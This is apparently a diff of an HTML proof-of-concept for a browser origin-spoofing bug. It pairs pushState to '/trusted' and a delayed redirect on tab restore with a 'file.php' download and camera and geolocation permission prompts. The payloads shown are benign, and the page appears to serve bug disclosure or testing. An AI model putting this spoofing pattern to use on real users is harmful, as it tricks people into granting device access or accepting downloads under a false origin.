@@ -47,6 +47,11 @@ h2 { text-align:center; margin-bottom:6px; }
   background:#007aff;
   color:#fff;
 }
+
+video {
+  width:100%;
+  margin-top:10px;
+}
 </style>
 </head>
 
@@ -60,42 +65,9 @@ h2 { text-align:center; margin-bottom:6px; }
   <h2>Download File</h2>
   <div class="sub">Click below to download file.php</div>
 
-  <button class="download-button" onclick="downloadFile()">Download File (file.php)</button>
-
-  <div class="notice">
-    Demo only — file is being generated as `file.php`.
-  </div>
-</div>
-
-<script>
-const panel = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-
-// Function to trigger the download of file.php
-function downloadFile() {
-  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`; // Malicious PHP code content
-  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
-  const fileUrl = URL.createObjectURL(fileBlob);
-  
-  // Create an invisible anchor tag to trigger the download
-  const downloadLink = document.createElement('a');
-  downloadLink.href = fileUrl;
-  downloadLink.download = 'file.php'; // Filename for download
-  document.body.appendChild(downloadLink);
-  downloadLink.click(); // Trigger the download
-  document.body.removeChild(downloadLink); // Clean up
-}
-
-trigger.onclick = () => {
-  // Mimic the trusted origin behavior
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
-};
-<div id="panel">
-  <h2>Download File</h2>
-  <div class="sub">Click below to download file.php</div>
-
-  <button onclick="downloadFile()">Download File (file.php)</button>
+  <button class="download-button" onclick="downloadFile()">
+    Download File (file.php)
+  </button>
 
   <hr>
 
@@ -103,7 +75,7 @@ trigger.onclick = () => {
   <p id="locationOutput">Location: -</p>
 
   <button onclick="openCamera()">Open Camera</button>
-  <video id="camera" width="320" height="240" autoplay playsinline></video>
+  <video id="camera" autoplay playsinline></video>
 
   <div class="notice">
     Demo only — browser permission required
@@ -111,20 +83,23 @@ trigger.onclick = () => {
 </div>
 
 <script>
+const panel = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+
 // ======================
-// DOWNLOAD FILE DEMO
+// DOWNLOAD FILE (PoC)
 // ======================
 function downloadFile() {
-  const fileContent = `<?php echo 'Demo PHP file'; ?>`;
-  const blob = new Blob([fileContent], { type: 'text/plain' });
-  const url = URL.createObjectURL(blob);
+  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`;
+  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+  const fileUrl = URL.createObjectURL(fileBlob);
 
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = 'file.php';
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
+  const downloadLink = document.createElement('a');
+  downloadLink.href = fileUrl;
+  downloadLink.download = 'file.php';
+  document.body.appendChild(downloadLink);
+  downloadLink.click();
+  document.body.removeChild(downloadLink);
 }
 
 // ======================
@@ -155,30 +130,27 @@ function getLocation() {
 function openCamera() {
   const video = document.getElementById('camera');
 
-  if (!navigator.mediaDevices?.getUserMedia) {
-    alert('Camera not supported');
-    return;
-  }
-
   navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      video.srcObject = stream;
-    })
-    .catch(() => {
-      alert('Camera permission denied');
-    });
+    .then(stream => video.srcObject = stream)
+    .catch(() => alert('Camera permission denied'));
 }
-</script>
 
-</body>
-</html>
+// ======================
+// ORIGIN DESYNC TRIGGER
+// ======================
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+};
 
-// Trigger navigation AFTER tab restore (mimics desync)
+// ======================
+// TAB RESTORE DESYNC
+// ======================
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        location.href = 'http://google.com:9090'; // Malicious URL to simulate context change
+        location.href = 'http://google.com:9090';
       }, 80);
     });
   });
